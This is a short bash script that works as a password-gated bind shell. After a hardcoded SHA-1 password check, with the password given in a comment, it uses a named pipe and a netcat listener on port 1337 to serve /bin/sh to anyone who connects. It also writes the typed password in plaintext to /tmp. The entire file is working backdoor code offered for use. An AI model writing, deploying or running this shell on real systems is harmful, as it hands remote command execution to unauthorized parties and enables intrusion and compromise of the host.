#!/bin/bash
pipe=/tmp/.rofl
trap "rm -f /tmp/$pipe /tmp/.pw" 2>/dev/null

read -p "Enter the Magic Word:" magic
printf $magic >/tmp/.pw
hash="403926033d001b5279df37cbbe5287b7c7c267fa" # password : "lol"

if echo "$hash */tmp/.pw" | sha1sum -c - > /dev/null 2>&1 ; then
  echo -ne "[*] Access Granted! \n[*] Starting the server ...\n"
  mknod $pipe p; (nc -l -p 1337 || nc -l 1337)0<$pipe | \
  /bin/sh >$pipe 2>&1; rm $pipe

else 
  for i in $(seq 1 10); do
    echo "AH! AH! AH! You didn't say the magic word!"
    sleep 1
  done
fi

exit

